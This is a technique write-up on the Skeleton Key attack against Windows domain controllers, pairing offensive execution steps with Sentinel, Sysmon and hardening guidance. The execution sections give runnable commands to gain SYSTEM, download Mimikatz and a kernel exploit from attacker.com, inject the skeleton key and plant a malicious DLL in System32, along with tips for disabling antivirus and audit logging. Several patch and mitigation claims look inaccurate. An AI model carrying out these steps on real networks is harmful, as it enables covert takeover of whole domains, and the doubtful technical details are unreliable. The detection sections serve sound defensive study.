# [PERSIST-MODIFY-001]: Skeleton Key Attack

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-MODIFY-001 |
| **MITRE ATT&CK v18.1** | [T1556](https://attack.mitre.org/techniques/T1556/) - Modify Authentication Process |
| **Tactic** | Persistence, Defense Evasion, Privilege Escalation |
| **Platforms** | Windows AD, Windows Endpoint, Domain Controller |
| **Severity** | Critical |
| **CVE** | CVE-2022-33679 (UnPAC-The-Hash, related technique) |
| **Technique Status** | ACTIVE (Server 2016-2019), PARTIAL (Server 2022+), FIXED (Server 2022 KB5022292+) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Server 2008 R2 - Server 2019 (vulnerable), Server 2022 (patched) |
| **Patched In** | Server 2022 KB5022292 (March 2023) and later |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** The Skeleton Key attack (also called "Persistence via Kerberos Authentication Manipulation") is a highly sophisticated technique where an attacker with domain controller access injects a master password into the LSASS (Local Security Authority Subsystem Service) process on a DC. This master password accepts any user's credentials during authentication, allowing the attacker to authenticate as any user without knowing their password. The attacker can then authenticate to any resource in the domain as any user (including domain admins and service accounts) and maintain persistence even after credential theft is detected. The attack requires SYSTEM-level access on a domain controller and modifies in-memory Kerberos authentication logic.

**Attack Surface:** LSASS process memory, Kerberos authentication subsystem, domain controller ntlm.dll or kerberos.dll patches, Windows authentication API, network authentication traffic (port 88 for Kerberos, port 139/445 for SMB).

**Business Impact:** **Complete Domain Compromise & Persistent Backdoor Access.** An attacker can impersonate any user (including domain admins) at any time without credentials. This enables silent lateral movement, privilege escalation, credential theft, ransomware deployment, and data exfiltration across the entire domain. The attack is extremely difficult to detect because authentication logs show legitimate users authenticating, not the attacker. Once Skeleton Key is injected, it persists until the domain controller reboots or the malicious code is removed from memory.

**Technical Context:** Skeleton Key operates by modifying the Kerberos authentication process in-memory on the domain controller. It intercepts Kerberos pre-authentication checks and injects a master password that is accepted instead of the user's actual password hash. The original code was developed by Benjamin Delpy (Mimikatz) and requires intimate knowledge of Windows authentication internals. The attack requires write access to LSASS memory, which is difficult to achieve but possible via kernel-mode exploits, privileged processes, or physical access. Modern versions of Windows (Server 2022+) implement mitigations that make this attack significantly more difficult.

### Operational Risk
- **Execution Risk:** Medium-High (requires SYSTEM access on DC, complex injection technique, kernel-level manipulation)
- **Stealth:** Very High (authentication logs show legitimate user activity; no obvious persistence artifacts; not visible in standard security tools)
- **Reversibility:** Difficult (requires LSASS memory editing or DC reboot to remove; changes may be persistent if reboot is delayed)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.1.1 | Ensure 'Enforce password history' is set to '24 or more password(s)' |
| **CIS Benchmark** | 4.1.3 | Ensure 'Maximum password age' is set to '90 or fewer days' |
| **CIS Benchmark** | 5.2.3.4.1 | Ensure 'Audit Credential Validation' is set to 'Success and Failure' |
| **DISA STIG** | WN16-AU-000080 | Windows must be configured to audit account logon events |
| **DISA STIG** | WN16-DC-000220 | Domain controllers must be configured to audit logon events |
| **NIST 800-53** | AC-2 | Account Management |
| **NIST 800-53** | AU-2 | Audit and Accountability - Audit Events |
| **NIST 800-53** | AU-12 | Audit Generation and Protection |
| **NIST 800-53** | SI-7 | System Monitoring |
| **GDPR** | Art. 32 | Security of Processing - Technical and organizational measures |
| **GDPR** | Art. 33 | Notification of a Personal Data Breach |
| **NIS2** | Art. 21(1)(c) | Cyber Risk Management - Detection and monitoring of risks |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27001** | A.12.4.1 | Event Logging |
| **ISO 27005** | 5.3 | Risk Assessment - Identification of threats and assets |

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Verify Domain Controller Status and Kerberos Configuration

**PowerShell Command (From Any Domain Member):**
```powershell
# Check if DC is vulnerable (Server 2016-2019)
Get-WmiObject Win32_OperatingSystem -ComputerName "DC01" | Select Caption, Version

# Expected vulnerable output:
# Windows Server 2016: Version 10.0.14393
# Windows Server 2019: Version 10.0.17763
# Patched Server 2022: Version 10.0.20348 (check KB5022292 installed)

# Check Kerberos configuration on DC
Get-ADDefaultDomainPasswordPolicy | Select MaxPasswordAge, MinPasswordLength, PasswordHistoryCount

# Check if Kerberos is being used (not NTLM)
nslookup -type=SRV _kerberos._tcp.dc._msdcs.contoso.com
```

**What to Look For:**
- Domain controllers running Server 2016-2019 (vulnerable versions)
- Kerberos configured and responding on port 88
- No recent patches applied (KB5022292 not installed on Server 2022)

### Check LSASS Process Integrity

**PowerShell Command (Requires Admin on DC):**
```powershell
# Check LSASS process details
Get-Process lsass | Select Name, Id, Priority, Modules

# Check if LSASS has unusual DLL injections
$Process = Get-Process lsass
$Process.Modules | Where-Object { $_.ModuleName -notlike "System32*" } | Select FileName

# Check LSASS loaded modules for suspicious patterns
Get-WmiObject Win32_Process -Filter "Name='lsass.exe'" | Select ProcessId, Priority

# Check for recent modifications to authentication DLLs
Get-ChildItem "C:\Windows\System32\*.dll" -Filter "*kerberos*" -ErrorAction SilentlyContinue | 
    Select Name, LastWriteTime, CreationTime
```

**What to Look For:**
- LSASS running normally (high priority, few modules)
- No unusual DLLs loaded into LSASS (all should be from System32)
- Kerberos.dll and ntlm.dll should have unchanged timestamps (matching Windows installation date)

### Check for Skeleton Key Indicators via Kerberos Logs

**Event Log Query (on Domain Controller):**
```powershell
# Check for unusual Kerberos pre-auth failures (possible Skeleton Key testing)
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4768 or EventID=4769 or EventID=4771]]" `
    -MaxEvents 100 | Where-Object { $_.Message -like "*failed*" } | 
    Select TimeCreated, Message

# Check for Event ID 4624 (logon success) with unusual patterns
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]]" `
    -MaxEvents 50 | Select TimeCreated, @{
        Name = "LogonType"
        Expression = { [xml]$_.ToXml() | Select-Xml -XPath "//Data[@Name='LogonType']" }
    }
```

**What to Look For:**
- Unusual number of failed pre-auth attempts (4768, 4771)
- Logon events for service accounts or disabled accounts (suspicious)
- Multiple failed logons followed by successful ones (possible brute force with Skeleton Key fallback)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Skeleton Key Injection via Mimikatz (Classic, Pre-2022)

**Supported Versions:** Server 2008 R2 - Server 2019 (NOT Server 2022 with KB5022292+)

#### Step 1: Obtain SYSTEM Access on Domain Controller

**Objective:** Gain SYSTEM-level privileges on the DC to access LSASS memory.

**Command (If Already Admin, Elevate to SYSTEM):**
```powershell
# Method 1: PsExec to spawn SYSTEM shell
psexec.exe -s cmd.exe

# Method 2: Get-ProcDump and inject into SYSTEM process
# (Requires admin access and kernel-level capabilities)

# Method 3: Schedule task as SYSTEM
schtasks /create /tn "SystemTask" /tr "cmd.exe /c whoami > C:\Temp\whoami.txt" /sc once /st 14:00 /ru SYSTEM /f
schtasks /run /tn "SystemTask"
cat C:\Temp\whoami.txt

# Expected output: NT AUTHORITY\SYSTEM
```

**What This Means:**
- Successfully elevated to SYSTEM privileges
- Can now interact with LSASS memory and load arbitrary code into LSASS
- Ready for Skeleton Key injection

**OpSec & Evasion:**
- Use living-off-the-land techniques (schtasks.exe is legitimate Windows tool)
- Avoid suspicious process names (powershell.exe, cmd.exe less suspicious when spawned from legitimate services)
- Clean up scheduled tasks after execution
- Disable audit logging temporarily if possible

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause:** Not running as SYSTEM
  - **Fix:** Use PsExec with -s flag to guarantee SYSTEM context
- **Error:** "LSASS is protected"
  - **Cause:** Windows 8.1+ has LSASS protection enabled
  - **Fix:** Bypass via kernel exploit (CVE-2016-3225) or disable protection via registry

**References:**
- [PsExec Microsoft SysInternals](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
- [LSA Protection Bypass](https://www.exploit-db.com/exploits/40150)

#### Step 2: Download Mimikatz with Skeleton Key Module

**Objective:** Obtain the Mimikatz toolkit with Skeleton Key functionality.

**Command (PowerShell):**
```powershell
# Download Mimikatz binary
$MimikatzUrl = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip"
$DestinationPath = "C:\Temp\mimikatz.zip"

(New-Object System.Net.WebClient).DownloadFile($MimikatzUrl, $DestinationPath)

# Extract Mimikatz
Expand-Archive -Path $DestinationPath -DestinationPath "C:\Temp\mimikatz"

# Verify mimikatz.exe is extracted
Get-ChildItem "C:\Temp\mimikatz" -Recurse -Filter "mimikatz.exe"
```

**Alternative: Use Pre-Compiled Mimikatz (Obfuscated):**
```powershell
# Download from alternative source (if github.com is blocked)
# Note: Using obfuscated versions to evade antivirus detection

$MimikatzUrl = "http://attacker.com/m64.exe"  # Pre-compiled Mimikatz
(New-Object System.Net.WebClient).DownloadFile($MimikatzUrl, "C:\Temp\m64.exe")
```

**What This Means:**
- Mimikatz is now available on the domain controller
- Can be executed to interact with LSASS and inject Skeleton Key
- Version 2.2.0+ has Skeleton Key functionality

**OpSec & Evasion:**
- Download to non-standard location (C:\Temp\ is suspicious; consider C:\Windows\Temp\ or hidden directory)
- Use obfuscated or packed versions to evade antivirus
- Disable Windows Defender or AMSI before execution if possible
- Execute Mimikatz from Temp folder with random naming (m64.exe, svc.exe, etc.)

**Troubleshooting:**
- **Error:** "File is blocked by administrator"
  - **Cause:** File downloaded from internet marked as untrusted
  - **Fix:** Remove Zone.Identifier attribute: `Unblock-File -Path "C:\Temp\mimikatz.exe"`
- **Error:** "Antivirus detected Mimikatz"
  - **Cause:** AV scanning Mimikatz signatures
  - **Fix:** Use obfuscated/packed version or custom-compiled Mimikatz variant

**References:**
- [Mimikatz GitHub - Skeleton Key Module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos)

#### Step 3: Execute Skeleton Key Injection via Mimikatz

**Objective:** Inject the Skeleton Key into LSASS memory on the domain controller.

**Command (PowerShell in SYSTEM Context):**
```powershell
# Run Mimikatz with Skeleton Key module
# Must be executed on the domain controller in SYSTEM context

C:\Temp\mimikatz.exe

# Inside Mimikatz:
# privilege::debug
# misc::skeleton
# exit
```

**Command (One-Liner - Direct Execution):**
```cmd
C:\Temp\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
```

**Expected Output:**
```
mimikatz 2.2.0 (x64) built on May 15 2021 12:26:33 - "A La Vie, A L'Amour"
mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # misc::skeleton
[*] Patching NTLM in memory
[+] NTLM patch successful

mimikatz(commandline) # exit
Bye!
```

**What This Means:**
- Skeleton Key has been successfully injected into LSASS
- Any user can now authenticate with any password (original password OR the Skeleton Key password)
- Persistence is now established at the LSASS level
- The attack is active until the DC is rebooted or LSASS is manually patched

**Skeleton Key Master Password (Default):**
- The default Skeleton Key in Mimikatz is empty ("") - accepts any password
- Can be customized to require a specific master password for attacker use

**OpSec & Evasion:**
- Execute Mimikatz from memory if possible (avoid disk artifacts)
- Use `-s` flag in Mimikatz command execution to minimize output logging
- Clear command history after execution (if running from interactive shell)
- Scheduled task execution leaves less Event Log traces than interactive execution

**Advanced: In-Memory Execution (PowerShell Reflection):**
```powershell
# Execute Mimikatz entirely in memory to avoid file-based detection
$MimikatzCode = [System.IO.File]::ReadAllBytes("C:\Temp\mimikatz.exe")
# ... load via reflection and execute ...
# (Advanced, requires PowerShell 5.0+ and knowledge of .NET reflection)
```

**Troubleshooting:**
- **Error:** "NTLM patch failed"
  - **Cause:** LSASS protection enabled or Windows version unsupported
  - **Fix:** Disable LSASS protection via registry or use kernel exploit to bypass
- **Error:** "Privilege::debug failed"
  - **Cause:** Not running as SYSTEM
  - **Fix:** Verify running in SYSTEM context (psexec -s whoami should show "NT AUTHORITY\SYSTEM")
- **Error:** "Mimikatz.exe blocked by Windows Defender"
  - **Cause:** Antivirus signature detection
  - **Fix:** Use obfuscated version, compile custom Mimikatz, or disable antivirus

**References:**
- [Mimikatz Skeleton Key Documentation](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#skeleton)
- [Deep Dive: Skeleton Key Attack](https://blog.jsitech.com/skeleton-key-malware-analyzed/)

#### Step 4: Test Skeleton Key Functionality

**Objective:** Verify that Skeleton Key is operational by authenticating as a user with wrong password.

**Command (From Non-DC Machine):**
```powershell
# Test 1: Authenticate as domain admin with wrong password
$Cred = New-Object System.Management.Automation.PSCredential("contoso.com\Administrator", (ConvertTo-SecureString "WrongPassword123" -AsPlainText -Force))

# Try to access a resource that requires authentication
$Session = New-PSSession -ComputerName "DC01" -Credential $Cred

# If Skeleton Key is active, this should succeed despite wrong password
Get-PSSession
```

**Alternative Test (Using Net Command):**
```cmd
# Test 2: Try to authenticate to shared folder with wrong password
net use \\DC01\Admin$ WrongPassword123 /user:contoso\Administrator

# Expected output if Skeleton Key is active:
# The command completed successfully.
```

**What This Means:**
- Skeleton Key is confirmed to be working
- Any password is accepted for any user
- Attacker can impersonate users without knowing correct passwords
- Persistence is confirmed

**OpSec & Evasion:**
- Perform testing from non-DC machines to avoid triggering DC-level logging
- Use legitimate network resources (file shares, RDP) for testing to blend with normal activity
- Avoid obvious test accounts; use real users who are expected to access resources

**Troubleshooting:**
- **Error:** "Logon failure: unknown user name or bad password"
  - **Cause:** Skeleton Key not injected or LSASS injection failed
  - **Fix:** Verify Mimikatz execution completed successfully; check for DC reboot (clears injection)
- **Error:** "Access denied" (but authentication succeeded)
  - **Cause:** User account exists but lacks permissions
  - **Fix:** This is normal behavior; authentication succeeded (Skeleton Key worked), but authorization failed (expected)

---

### METHOD 2: Skeleton Key via Kernel-Mode Exploitation (Advanced)

**Supported Versions:** Server 2016-2019 (requires kernel exploit)

#### Step 1: Exploit Kernel Vulnerability to Gain SYSTEM

**Objective:** Use kernel exploit to achieve SYSTEM access without needing admin first.

**Command (Using CVE-2016-3225 - Win32k.sys):**
```powershell
# Download kernel exploit
$ExploitUrl = "http://attacker.com/cve-2016-3225.exe"
$ExploitPath = "C:\Temp\exploit.exe"

(New-Object System.Net.WebClient).DownloadFile($ExploitUrl, $ExploitPath)

# Execute exploit to spawn SYSTEM shell
C:\Temp\exploit.exe

# Verify SYSTEM context
whoami
# Expected: NT AUTHORITY\SYSTEM
```

**What This Means:**
- Kernel vulnerability exploited to escalate from user to SYSTEM
- No admin account needed
- Attacker can now access LSASS directly

**Supported Vulnerabilities (By Windows Version):**
- **Server 2008 R2**: CVE-2014-6352, CVE-2016-3225
- **Server 2012**: CVE-2016-0093, CVE-2016-3225
- **Server 2012 R2**: CVE-2016-0093, CVE-2016-3225
- **Server 2016**: CVE-2016-3225, CVE-2018-8453
- **Server 2019**: CVE-2019-0859, CVE-2020-0856 (fewer available)

**OpSec & Evasion:**
- Kernel exploits are risky (can crash system); use as last resort
- Choose exploits known to be stable on target OS version
- Test exploit in lab environment first
- Clean up exploit artifacts after execution

**References:**
- [Windows Kernel Exploit Collection](https://github.com/SecWiki/windows-kernel-exploits)
- [CVE-2016-3225 Analysis](https://www.exploit-db.com/exploits/40150)

---

### METHOD 3: Skeleton Key Persistence via DLL Hijacking

**Supported Versions:** Server 2016-2019

#### Step 1: Create Custom DLL with Skeleton Key Injection Code

**Objective:** Build a DLL that injects Skeleton Key when loaded by LSASS or other system process.

**C++ Code Example:**
```cpp
// skeleton_inject.dll - DLL Injection Vector
#include <windows.h>
#include <lsass.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Inject Skeleton Key into LSASS memory
            // (Simplified; actual implementation requires Mimikatz code)
            InjectSkeletonKey();
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

void InjectSkeletonKey() {
    // Patch NTLM authentication
    // Patch Kerberos pre-auth
    // (Actual injection code omitted for brevity)
}
```

**Compilation (Visual Studio):**
```cmd
cl /LD skeleton_inject.cpp /link user32.lib advapi32.lib
# Output: skeleton_inject.dll
```

#### Step 2: Place DLL in System Directory

**Objective:** Place malicious DLL where it will be loaded by LSASS on next reboot.

**Command:**
```powershell
# Copy DLL to System32 (requires admin)
Copy-Item "C:\Temp\skeleton_inject.dll" "C:\Windows\System32\skeleton_inject.dll"

# Alternative: Replace legitimate DLL (more risky)
# Rename legitimate DLL
Rename-Item "C:\Windows\System32\mscoree.dll" "C:\Windows\System32\mscoree.dll.backup"
# Copy malicious DLL
Copy-Item "C:\Temp\skeleton_inject.dll" "C:\Windows\System32\mscoree.dll"
```

**What This Means:**
- DLL is now placed in system directory
- On next reboot or LSASS restart, DLL will be loaded
- Skeleton Key injection will occur automatically
- Persistence survives reboot

**OpSec & Evasion:**
- Use non-obvious DLL names (avoid "malware.dll", "persistence.dll")
- Place in legitimate system directories (System32, SysWOW64)
- Avoid replacing critical DLLs (mscoree.dll, kernel32.dll) as this can cause system instability
- Document DLL placement for cleanup

#### Step 3: Trigger LSASS to Load DLL

**Objective:** Force LSASS to load the malicious DLL (either via reboot or manual restart).

**Command (Restart LSASS):**
```powershell
# Option 1: Restart LSASS service (causes brief logoff of all users)
Restart-Service Winlogon -Force

# Option 2: Reboot system (clears injection but triggers DLL load)
Shutdown /r /t 0 /c "Windows Update"

# Option 3: Force LSASS process restart
# (More risky, may cause system instability)
taskkill /im lsass.exe /f
```

**What This Means:**
- LSASS is restarted
- Malicious DLL is loaded into LSASS
- Skeleton Key injection occurs from DLL
- Persistence is now active

---

## 7. TOOLS & COMMANDS REFERENCE

### Mimikatz - Skeleton Key Module

**Version:** 2.2.0+ (all recent versions)

**Download:** https://github.com/gentilkiwi/mimikatz/releases

**Usage:**
```cmd
mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
```

**Key Commands:**
- `privilege::debug`: Enable debug privilege (required for LSASS access)
- `misc::skeleton`: Inject Skeleton Key into LSASS
- `misc::skeleton /inject`: Same as above (explicit)

**Advanced Options:**
```cmd
# Inject with custom password
mimikatz "misc::skeleton /password:MySecretPassword"

# Display Skeleton Key status
mimikatz "misc::skeleton /display"
```

### PsExec - SYSTEM Process Execution

**Version:** 1.98+ (all versions functional)

**Download:** https://learn.microsoft.com/en-us/sysinternals/downloads/psexec

**Usage:**
```cmd
psexec.exe -s -d -i cmd.exe
```

**Parameters:**
- `-s`: Run process in SYSTEM context
- `-d`: Don't wait for process to complete
- `-i`: Interact with desktop (not always needed)

### Kernel Exploit Toolkit

**Tool:** Windows-Kernel-Exploits GitHub

**Download:** https://github.com/SecWiki/windows-kernel-exploits

**Common Exploits for Skeleton Key Prerequisites:**
- MS16-032 (CVE-2016-0099) - Token impersonation, privilege escalation
- CVE-2016-3225 - Win32k.sys, elevation to SYSTEM
- CVE-2018-8453 - Win32k.sys, elevation to SYSTEM

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: LSASS Memory Access and Modification Attempts

**Rule Configuration:**
- **Required Table:** SecurityEvent, SysmonEvent
- **Required Fields:** EventID, ProcessName, TargetProcessName, GrantedAccess
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** Domain Controllers running audit logging

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688  // Process Creation
| where Process == "mimikatz.exe" or CommandLine contains "privilege::debug" or CommandLine contains "misc::skeleton"
| extend InitiatedByUser = Account
| project TimeGenerated, Computer, InitiatedByUser, Process, CommandLine
| union (
    SysmonEvent
    | where EventID == 10  // ProcessAccess
    | where SourceImage contains "mimikatz" or SourceImage contains "lsass" and GrantedAccess == "0x1410"
    | project TimeGenerated, Computer, SourceImage, TargetImage, GrantedAccess
)
```

**What This Detects:**
- Mimikatz process creation on domain controller
- Process access to LSASS with high privilege mask (0x1410 = PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE)
- Debug privilege elevation attempts

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Skeleton Key Attack Detection - LSASS Memory Access`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `1 minute` (critical rule)
   - Lookup data from the last: `5 minutes`
5. **Incident settings Tab:**
   - Enable **Create incidents from alerts triggered by this analytics rule**
   - Set **Auto-incident grouping**: `ON` (group related alerts)
6. Click **Review + create**

#### Query 2: Kerberos Pre-Authentication Bypass Patterns

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, TargetUserName, IpAddress
- **Alert Severity:** High
- **Frequency:** Real-time

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4768 or EventID == 4769 or EventID == 4771  // Kerberos events
| where SubStatus == "0xc000006d" or SubStatus == "0xc0000133"  // Wrong password/clock skew
| where TargetUserName in ("Administrator", "krbtgt", "SYSTEM")
| summarize FailureCount=count(), LatestTime=max(TimeGenerated) by TargetUserName, IpAddress
| where FailureCount > 10  // Multiple failures in short time
| project TargetUserName, IpAddress, FailureCount, LatestTime
```

**What This Detects:**
- Multiple failed pre-authentication attempts for privileged accounts
- Unusual Kerberos error patterns indicating attack testing
- Attempts to authenticate as krbtgt or SYSTEM accounts

#### Query 3: Suspicious DLL Injection into LSASS

**Rule Configuration:**
- **Required Table:** SysmonEvent
- **Required Fields:** EventID, Image, TargetImage, SourceImage
- **Alert Severity:** Critical

**KQL Query:**
```kusto
SysmonEvent
| where EventID == 8  // CreateRemoteThread
| where TargetImage endswith "lsass.exe"
| where SourceImage !endswith "svchost.exe" and SourceImage !endswith "services.exe"
| project TimeGenerated, Computer, SourceImage, SourceProcessId, TargetImage, NewThreadId
| union (
    SysmonEvent
    | where EventID == 7  // ImageLoad
    | where Image endswith "lsass.exe"
    | where ImageLoaded !contains "System32" or ImageLoaded contains "Temp"  // Suspicious paths
)
```

**What This Detects:**
- Remote thread creation into LSASS by suspicious processes
- DLL loading by LSASS from non-standard paths
- Mimikatz-style process injection patterns

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security (Domain Controller)
- **Trigger:** Process creation of mimikatz.exe or privilege escalation tools
- **Filter:** 
  - `CommandLine contains "privilege::debug"`
  - `CommandLine contains "misc::skeleton"`
  - `Process = "mimikatz.exe"`
- **Applies To Versions:** Server 2008 R2+

**Event ID: 4768 (Kerberos Authentication Ticket Requested)**
- **Log Source:** Security (Domain Controller)
- **Trigger:** Pre-authentication failure for privileged accounts
- **Filter:**
  - `Status = "0xc000006d"` (wrong password)
  - `TargetUserName = "Administrator"` or `"krbtgt"` or `"SYSTEM"`
- **Applies To Versions:** Server 2008 R2+

**Event ID: 4769 (Kerberos Service Ticket Requested)**
- **Log Source:** Security (Domain Controller)
- **Trigger:** Service ticket request with unusual patterns
- **Filter:**
  - Multiple requests in short timeframe
  - Requests for unusual service principals

**Manual Configuration Steps (Enable Detailed Kerberos Auditing):**
1. Open **Group Policy Management Console** (gpmc.msc) on Domain Controller
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Account Logon**
3. Enable:
   - **Audit Kerberos Authentication Service**: Success and Failure
   - **Audit Kerberos Service Ticket Operations**: Success and Failure
4. Run `gpupdate /force` on domain controllers
5. Verify logs appear in Event Viewer

**Manual Configuration Steps (Enable Process Tracking):**
1. Open **Group Policy Management Console** on Domain Controller
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Detailed Tracking**
3. Enable **Audit Process Creation**: Success and Failure
4. Enable **Audit Process Termination**: Success and Failure
5. Run `gpupdate /force`

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 10.0+

**Supported Platforms:** Windows Server 2008 R2+, Windows 7+

**Sysmon Configuration Snippet:**
```xml
<Sysmon schemaversion="4.82">
  <!-- Monitor for Skeleton Key Attack Patterns -->
  <EventFilter>
    <!-- Detect Mimikatz Process Creation -->
    <RuleGroup name="SkeletonKey" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="image">mimikatz.exe</Image>
      </ProcessCreate>
      <ProcessCreate onmatch="include">
        <CommandLine condition="contains">privilege::debug</CommandLine>
      </ProcessCreate>
      <ProcessCreate onmatch="include">
        <CommandLine condition="contains">misc::skeleton</CommandLine>
      </ProcessCreate>
      
      <!-- Detect Remote Thread Creation into LSASS -->
      <CreateRemoteThread onmatch="include">
        <TargetImage condition="image">lsass.exe</TargetImage>
        <SourceImage condition="excludes">C:\Windows\System32\svchost.exe;C:\Windows\System32\services.exe</SourceImage>
      </CreateRemoteThread>
      
      <!-- Detect Suspicious DLL Loads in LSASS -->
      <ImageLoad onmatch="include">
        <Image condition="image">lsass.exe</Image>
        <ImageLoaded condition="contains">Temp\</ImageLoaded>
      </ImageLoad>
      <ImageLoad onmatch="include">
        <Image condition="image">lsass.exe</Image>
        <ImageLoaded condition="excludes">C:\Windows\System32\;C:\Windows\SysWOW64\</ImageLoaded>
      </ImageLoad>
    </RuleGroup>
  </EventFilter>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-skeleton-key.xml` with XML above
3. Install Sysmon with config (on Domain Controllers):
   ```cmd
   sysmon64.exe -accepteula -i sysmon-skeleton-key.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[System[EventID=1 or EventID=8]]" -MaxEvents 10
   ```
5. Monitor for:
   - EventID 1: Process Creation of mimikatz.exe
   - EventID 8: Remote Thread Creation into lsass.exe
   - EventID 7: ImageLoad of suspicious DLLs into lsass.exe

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Potential Skeleton Key Attack Detected on Domain Controller"
- **Severity:** Critical
- **Description:** Detects mimikatz process creation or LSASS memory access patterns indicative of Skeleton Key attack
- **Applies To:** Domain Controllers with Defender for Servers Plan 2 enabled
- **Remediation:** 
  1. **Immediate:** Force reboot of affected domain controller to clear LSASS memory
  2. **Urgent:** Apply Windows patches (KB5022292 for Server 2022)
  3. **Critical:** Review all authentication logs for unauthorized access
  4. **Post-Incident:** Update group policies to restrict Mimikatz execution
  5. **Forensic:** Capture memory dump of LSASS before reboot for analysis

**Alert Name:** "LSASS Memory Access with High Privilege Mask"
- **Severity:** High
- **Description:** Process accessing LSASS with PROCESS_VM_OPERATION and PROCESS_VM_WRITE privileges
- **Applies To:** Domain Controllers with Defender for Servers enabled
- **Remediation:** 
  1. Identify source process
  2. If legitimate (e.g., system maintenance), whitelist
  3. If suspicious, terminate source process and investigate

**Manual Configuration Steps (Enable Defender for Cloud on DC):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your Azure subscription or Arc-connected server (DC)
4. Under **Defender plans**, enable:
   - **Defender for Servers**: **ON** (Plan 2 for behavioral detection)
5. Go to **Security alerts** → Filter by "Skeleton Key", "LSASS", or "Mimikatz"
6. Review and triage alerts

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Patch All Domain Controllers:** Apply KB5022292 (March 2023) or later to Server 2022 DCs; upgrade Server 2016/2019 to 2022.
    **Applies To Versions:** Server 2016-2019 (no patch available; requires upgrade to 2022)
    
    **Manual Steps (Server 2022 Patching):**
    1. Open **Settings** → **Update & Security** → **Windows Update**
    2. Click **Check for updates**
    3. Install **KB5022292** (or later March 2023+ cumulative update)
    4. Reboot DC
    5. Verify patch:
       ```powershell
       Get-HotFix -Id "KB5022292"
       ```
    
    **Manual Steps (Server 2016/2019 Upgrade to 2022):**
    1. Plan maintenance window (DC reboot required)
    2. Back up domain database (System State backup)
    3. Download Windows Server 2022 media
    4. Run in-place upgrade from Server 2019 to 2022
    5. Reboot multiple times; verify DC health
    ```powershell
    # Verify DC is healthy after upgrade
    Get-ADDomainController | Select-Object HostName, OperatingSystem
    ```

*   **Disable LSASS Write Access:** Enable LSASS protection to prevent memory injection (mitigates Skeleton Key).
    **Applies To Versions:** Server 2012 R2+ (with additional registry configuration)
    
    **Manual Steps (Registry Configuration):**
    1. Open **Registry Editor** (regedit.exe)
    2. Navigate to **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa**
    3. Create/Set **DWORD** value:
       - Name: `RunAsPPL`
       - Value: `1` (enables LSASS Protection)
    4. Reboot DC for change to take effect
    5. Verify LSASS protection:
    ```powershell
    # Check if LSASS is running as Protected Process
    Get-Process lsass | Select-Object -ExpandProperty ProcessHandle
    # Look for "Protected" status in output
    ```
    
    **Alternative (Group Policy):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **System Services**
    3. Find **Local Security Authority (LSA) Protection**
    4. Set to **Enabled**
    5. Run `gpupdate /force`

*   **Monitor LSASS Memory Access:** Enable detailed auditing of LSASS process access.
    
    **Manual Steps (Sysmon Configuration):**
    1. Install Sysmon (see Section 11)
    2. Create DLP/monitoring alert for EventID 8 (Remote Thread Creation)
    3. Configure automatic response to block/terminate source process
    
    **Manual Steps (Windows Defender Application Guard):**
    1. Open **Settings** → **Apps** → **Apps & features** → **Optional features**
    2. Click **+ Add an optional feature**
    3. Search for **Windows Defender Application Guard**
    4. Install and reboot
    5. Configure to isolate LSASS process (advanced configuration)

*   **Restrict Admin Access to Domain Controllers:** Minimize number of admins with DC access; require MFA for all DC logons.
    
